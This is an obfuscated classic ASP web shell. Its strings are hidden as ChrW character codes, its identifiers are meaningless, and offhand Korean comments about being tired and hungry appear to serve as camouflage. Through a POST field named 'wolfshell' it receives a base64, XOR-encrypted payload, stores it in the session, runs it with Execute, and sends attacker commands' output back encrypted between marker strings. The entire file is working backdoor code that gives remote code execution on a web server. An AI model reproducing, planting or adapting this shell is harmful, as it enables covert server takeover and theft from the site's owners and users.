<%
' // 집에 가고 싶다...
Set d_99 = Server.CreateObject(ChrW(83)&ChrW(99)&ChrW(114)&ChrW(105)&ChrW(112)&ChrW(116)&ChrW(105)&ChrW(110)&ChrW(103)&ChrW(46)&ChrW(68)&ChrW(105)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(97)&ChrW(114)&ChrW(121))
Function fn_d_01(c1)
    Dim x1, n1
    Set x1 = CreateObject(ChrW(77)&ChrW(115)&ChrW(120)&ChrW(109)&ChrW(108)&ChrW(50)&ChrW(46)&ChrW(68)&ChrW(79)&ChrW(77)&ChrW(68)&ChrW(111)&ChrW(99)&ChrW(117)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(46)&ChrW(51)&ChrW(46)&ChrW(48))
    Set n1 = x1.CreateElement(ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(54)&ChrW(52))
    n1.dataType = ChrW(98)&ChrW(105)&ChrW(110)&ChrW(46)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(54)&ChrW(52)
    n1.text = c1
    fn_d_01 = n1.nodeTypedValue
End Function
Function fn_e_02(d2)
    Dim x2, n2
    Set x2 = CreateObject(ChrW(77)&ChrW(115)&ChrW(120)&ChrW(109)&ChrW(108)&ChrW(50)&ChrW(46)&ChrW(68)&ChrW(79)&ChrW(77)&ChrW(68)&ChrW(111)&ChrW(99)&ChrW(117)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(46)&ChrW(51)&ChrW(46)&ChrW(48))
    Set n2 = x2.CreateElement(ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(54)&ChrW(52))
    n2.dataType = ChrW(98)&ChrW(105)&ChrW(110)&ChrW(46)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(54)&ChrW(52)
    n2.nodeTypedValue = d2
    fn_e_02 = n2.text
End Function
Function fn_x_03(ct, bn)
    Dim bs, i, k_len
    Dim k_str : k_str = ChrW(51)&ChrW(99)&ChrW(54)&ChrW(101)&ChrW(48)&ChrW(98)&ChrW(56)&ChrW(97)&ChrW(57)&ChrW(99)&ChrW(49)&ChrW(53)&ChrW(50)&ChrW(50)&ChrW(52)&ChrW(97)
    k_len = Len(k_str)
    Set bs = CreateObject(ChrW(65)&ChrW(68)&ChrW(79)&ChrW(68)&ChrW(66)&ChrW(46)&ChrW(83)&ChrW(116)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(109))
    bs.CharSet = "iso-8859-1"
    bs.Type = 2
    bs.Open
    If IsArray(ct) Then
        ' // 배고파요, 치킨 먹고 싶다.
        Dim arr_sz : arr_sz = UBound(ct) + 1
        For i = 1 To arr_sz
            Dim v1, v2, v3
            v1 = AscB(MidB(ct, i, 1))
            v2 = Asc(Mid(k_str, (i Mod k_len) + 1, 1))
            v3 = (v1 Or v2) - (v1 And v2) ' // Equivalent to XOR
            bs.WriteText ChrW(v3)
        Next
    End If
    bs.Position = 0
    If bn Then
        bs.Type = 1
        fn_x_03 = bs.Read()
    Else
        fn_x_03 = bs.ReadText()
    End If
End Function
Dim v_data, s_key, r_data
v_data = Request.Form(ChrW(119)&ChrW(111)&ChrW(108)&ChrW(102)&ChrW(115)&ChrW(104)&ChrW(101)&ChrW(108)&ChrW(108))
s_key = ChrW(112)&ChrW(97)&ChrW(121)&ChrW(108)&ChrW(111)&ChrW(97)&ChrW(100)
If Not IsEmpty(v_data) Then
    If IsEmpty(Session(s_key)) Then
        ' // 오늘 회의는 정말 지루했다.
        v_data = fn_x_03(fn_d_01(v_data), False)
        Session(s_key) = v_data
        Response.End
    Else
        v_data = fn_x_03(fn_d_01(v_data), True)
        d_99.Add s_key, Session(s_key)
        Execute(d_99(s_key))
        r_data = run(v_data)
        Response.Write(ChrW(97)&ChrW(55)&ChrW(49)&ChrW(97)&ChrW(98)&ChrW(49))
        If Not IsEmpty(r_data) Then
            Response.Write fn_e_02(fn_x_03(r_data, True))
        End If
        Response.Write(ChrW(52)&ChrW(98)&ChrW(56)&ChrW(50)&ChrW(53)&ChrW(57))
    End If
End If
%>